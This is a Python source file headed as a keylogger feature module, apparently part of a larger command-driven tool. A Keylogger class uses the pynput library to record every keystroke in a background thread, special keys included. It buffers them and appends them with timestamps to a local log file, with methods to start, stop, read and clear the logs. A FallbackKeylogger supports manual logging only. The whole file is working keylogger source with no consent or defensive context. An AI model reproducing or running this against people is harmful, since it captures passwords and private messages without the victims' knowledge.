################################################
# Keylogger Feature Module                     #
# Captures and logs keystrokes                 #
################################################

import threading
import os
from datetime import datetime

# Try to import pynput, if not available, provide fallback
try:
    from pynput import keyboard  # Library for capturing keyboard events
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False


class Keylogger:
    """
    A keylogger that captures and logs keystrokes to a file.
    Works with or without pynput library.
    """
    
    def __init__(self, log_file='logs/keylog.txt'):
        """
        Initialize the keylogger
        
        Args:
            log_file: Path where keystroke logs will be saved
        """
        # Path to log file
        self.log_file = log_file
        # Buffer to store keystrokes before writing to file
        self.log_content = []
        # Flag indicating if keylogger is running
        self.is_running = False
        # Pynput keyboard listener object
        self.listener = None
        
        # Create logs directory if it doesn't exist
        os.makedirs(os.path.dirname(self.log_file), exist_ok=True)
    
    def on_press(self, key):
        """
        Callback function when a key is pressed
        
        Captures both regular keys and special keys (Enter, Space, etc.).
        Automatically saves logs every 50 keystrokes to prevent data loss.
        
        Args:
            key: Key object from pynput containing pressed key information
        """
        try:
            # Regular key press (letters, numbers, symbols)
            char = key.char
            self.log_content.append(char)
        except AttributeError:
            # Special key press (like Enter, Space, Ctrl, etc.)
            if key == keyboard.Key.space:
                self.log_content.append(' ')
            elif key == keyboard.Key.enter:
                self.log_content.append('\n')
                self.save_log()  # Save when Enter is pressed
            elif key == keyboard.Key.tab:
                self.log_content.append('\t')
            elif key == keyboard.Key.backspace:
                # Remove last character if backspace is pressed
                if self.log_content:
                    self.log_content.pop()
            else:
                # Other special keys (Ctrl, Alt, Shift, etc.)
                special_key = f'[{key.name.upper()}]'
                self.log_content.append(special_key)
        
        # Auto-save every 50 keystrokes to prevent data loss
        if len(self.log_content) >= 50:
            self.save_log()
    
    def save_log(self):
        """
        Save captured keystrokes to file
        
        Writes buffered keystrokes with timestamp to log file and clears buffer.
        """
        if self.log_content:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            try:
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(f'\n[{timestamp}] ')
                    f.write(''.join(self.log_content))
                    f.flush()  # Force write to disk
                self.log_content = []
            except Exception as e:
                print(f"Error saving log: {e}")
    
    def start(self):
        """
        Start the keylogger in non-blocking mode
        
        Creates a keyboard listener that runs in background thread.
        
        Returns:
            Status message indicating success or error
        """
        if not PYNPUT_AVAILABLE:
            return "Error: pynput library not available. Install with: pip install pynput"
        
        if self.is_running:
            return "Keylogger is already running"
        
        self.is_running = True
        # Start listener in non-blocking mode
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        return "Keylogger started successfully"
    
    def stop(self):
        """
        Stop the keylogger
        
        Stops the keyboard listener and saves any remaining buffered keystrokes.
        
        Returns:
            Status message indicating success or error
        """
        if not self.is_running:
            return "Keylogger is not running"
        
        self.is_running = False
        if self.listener:
            self.listener.stop()
        self.save_log()  # Save any remaining logs
        return "Keylogger stopped successfully"
    
    def get_logs(self):
        """
        Retrieve the content of the log file
        
        Returns:
            Contents of the keylog file or error message
        """
        try:
            if os.path.exists(self.log_file):
                with open(self.log_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                    if content:
                        return content
                    else:
                        return "Log file is empty"
            else:
                return "No logs available yet"
        except Exception as e:
            return f"Error reading logs: {str(e)}"
    
    def clear_logs(self):
        """
        Clear the log file
        
        Deletes the log file and resets the keystroke buffer.
        
        Returns:
            Status message indicating success or error
        """
        try:
            if os.path.exists(self.log_file):
                os.remove(self.log_file)
            self.log_content = []
            return "Logs cleared successfully"
        except Exception as e:
            return f"Error clearing logs: {str(e)}"
    
    def get_status(self):
        """
        Get the current status of the keylogger
        
        Returns:
            Dictionary containing keylogger status information
        """
        status = {
            'running': self.is_running,
            'log_file': self.log_file,
            'buffer_size': len(self.log_content),
            'pynput_available': PYNPUT_AVAILABLE
        }
        if os.path.exists(self.log_file):
            status['log_file_size'] = os.path.getsize(self.log_file)
        else:
            status['log_file_size'] = 0
        return status


# Standalone fallback keylogger (without pynput)
class FallbackKeylogger:
    """
    A fallback keylogger that uses system commands.
    Less reliable but doesn't require external libraries.
    """
    
    def __init__(self, log_file='logs/keylog.txt'):
        """
        Initialize fallback keylogger
        
        Args:
            log_file: Path where logs will be saved
        """
        self.log_file = log_file
        self.is_running = False
        os.makedirs(os.path.dirname(self.log_file), exist_ok=True)
    
    def start(self):
        """Fallback keylogger cannot auto-capture, only manual logging"""
        return "Fallback keylogger: Manual logging only. Use 'keylog_manual <text>' to log"
    
    def stop(self):
        """Stop fallback keylogger"""
        return "Fallback keylogger stopped"
    
    def log_manual(self, text):
        """
        Manually log text (fallback when pynput unavailable)
        
        Args:
            text: Text to log manually
            
        Returns:
            Status message indicating success or error
        """
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(f'\n[{timestamp}] {text}')
                f.flush()
            return "Text logged successfully"
        except Exception as e:
            return f"Error logging text: {str(e)}"
    
    def get_logs(self):
        try:
            if os.path.exists(self.log_file):
                with open(self.log_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                    if content:
                        return content
                    else:
                        return "Log file is empty"
            else:
                return "No logs available yet"
        except Exception as e:
            return f"Error reading logs: {str(e)}"
    
    def clear_logs(self):
        try:
            if os.path.exists(self.log_file):
                os.remove(self.log_file)
            return "Logs cleared successfully"
        except Exception as e:
            return f"Error clearing logs: {str(e)}"
